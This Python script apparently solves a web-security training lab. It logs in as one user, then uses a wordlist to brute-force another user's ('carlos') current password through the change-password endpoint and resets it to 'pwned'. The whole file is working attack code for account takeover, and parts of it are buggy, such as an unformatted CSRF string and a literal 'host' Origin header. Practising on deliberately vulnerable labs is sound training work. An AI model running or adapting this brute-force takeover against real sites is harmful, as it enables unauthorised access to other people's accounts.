#!/usr/bin/env python3

import helper
import ast
import itertools
import signal
import string
import sys
import json
import requests
from copy import deepcopy

extract_host = lambda session : json.loads(session.headers)['Host']

def interrupt_handler(signum, frame):
    print(f'Handling signal {signum} ({signal.Signals(signum).name}).')

    sys.exit(0)


def prepare_headers(host, referer):
    headers = {'Host': host, 'Referer': referer}
    return json.dumps(headers)


def establish_login_session(host, headers):
    '''
    login to service with login url
    return {status_code, session_token}
    '''
    # Obtain session token for login
    session = requests.Session()
    session.headers = headers
    resp = session.get(host)
    if resp.status_code != 200:
        raise Exception("ERROR: GET host response {}".format(resp.status_code))
    
    # obtain CSRF token for login request
    url = "{}/login".format(host)
    resp = session.get(url)
    if resp.status_code != 200:
        raise Exception("ERROR: GET /login response {}".format(resp.status_code)) 
    
    return session


def authn_credentials(session, headers, credentials, csrf=None):
    '''
    login to service with login url
    return {status_code, session_token}
    '''
    # login using API with session token and passing CSRF token in body
    # this will authenticate using credentials and auto redirect to mfa request (login2)
    data_content = ""
    if csrf:
        data_content = "csrf={csrf}&"
    
    data_content += "username={}&password={}".format(credentials['username'], credentials['password'])

    host = extract_host(session)
    return session.post(url="{}/login".format(host),
                        headers={'Referer': "{}/login".format(host), "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "70", "Origin": "host"},
                        data=data_content)


def change_password(session, username, password, new_password):
    '''
    login to service with login url
    return {status_code, session_token}
    '''
    headers = {}
    # login using API with session token and passing CSRF token in body
    # this will authenticate using credentials and auto redirect to mfa request (login2)
    # data_content = "username={}&current-password={}&password={}".format(username, password, "password")
    data_content = "username={}&current-password={}&new-password-1={}&new-password-2={}".format(username, password, new_password, new_password)
    print(f"Change Password: {data_content}")
    host = extract_host(session)

    return session.post(url="{}/my-account/change-password".format(host),
                        headers={'Referer': "{}/my-account?id=wiener".format(host), "Content-Type": "application/x-www-form-urlencoded", "Origin": "host"},
                        data=data_content)


def brute_force_password_reset(session, brute_passwords, credentials, new_password):
    host = extract_host(session)
    resp = None
    username = "carlos"
    cracked_password = None
    # password_attempt = "password"

    # loop over brute_passwords and try each one
    for password in brute_passwords:
        resp = change_password(session, username, password, new_password)
        if resp.status_code == 200:
            if resp.url.endswith('/login'):
                resp = authn_credentials(session,
                                         headers={'Referer': "{}/login".format(args.host)},
                                         credentials=credentials)
                if resp.status_code != 200:
                    raise Exception("Error: unrecoverable error: {}".format(password))
            else:
            # elif resp.text.find('Congratulations, you solved the lab!') != -1:
                # print(resp.text)
                print(resp.text.find('Congratulations, you solved the lab!'))
                cracked_password = password
                break
        else:   
            raise Exception("Error: unrecoverable error: {}".format(password))
        
    return cracked_password, new_password
        

def load_brute_force_passwords(file_path):
    passwords = []
    with open(file_path) as password_file:
        for line in password_file:
            passwords.append(line.rstrip())
    
    return passwords


if __name__ == "__main__":
    signal.signal(signal.SIGINT, interrupt_handler)
    args = helper.args()

    if args.verbose:
        print(f"host: {args.host} verbose: {args.verbose}")
        print(f"login api: {args.login} username: {args.username} password: {args.password}")

    password_list = load_brute_force_passwords(args.file)

    session = establish_login_session(args.host,
                                      helper.prepare_headers(prepare_headers(args.host, args.host)))
    resp = authn_credentials(session, headers={'Referer': "{}/login".format(args.host)}, credentials={'username': args.username, 'password': args.password})
    # NOTE requests.PUT will redirect according to the PUT/GET responses (Location)
    # this means that if it was successful the actual HTTP Response will be 200 not 302
    if resp.status_code != 200:
        raise Exception("ERROR: failed to login using credentials")
    
    print("Successfully logged in using credentials")

    password, new_password = brute_force_password_reset(session,
                                          password_list,
                                          credentials={'username': args.username, 'password': args.password},
                                          new_password='pwned')
    print(f"Cracked Password '{password}' changed to '{new_password}'")